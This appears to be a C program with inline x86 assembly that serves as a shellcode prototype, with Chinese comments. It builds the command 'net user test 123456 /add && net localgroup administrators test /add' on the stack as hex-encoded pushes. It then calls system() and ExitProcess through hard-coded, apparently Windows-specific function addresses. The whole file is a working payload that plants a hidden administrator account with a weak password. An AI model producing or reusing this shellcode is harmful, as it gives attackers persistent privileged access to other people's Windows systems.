int main()
{
 _asm{
  sub esp,0x50  //抬高栈帧
  xor ebx,ebx   //清零
  push ebx

  push 0x6464612f   
  push 0x20747365
  push 0x74207372
  push 0x6f746172
  push 0x7473696e
  push 0x696d6461
  push 0x2070756f
  push 0x72676c61
  push 0x636f6c20
  push 0x74656e20
  push 0x26262064
  push 0x64612f20
  push 0x36353433
  push 0x32312074
  push 0x73657420
  push 0x72657375
  push 0x2074656e
  // push "net user test 123456 /add && net localgroup administrators test /add"
  mov eax,esp   //用eax存放字符串的指针

  push eax  //system函数参数入栈
  mov eax,0x77bf93c7
  call eax        // call system

  push ebx  //ExitProcess函数参数入栈
  mov eax, 0x7c81caa2
  call eax       // call ExitProcess
 }
 return 0;
}
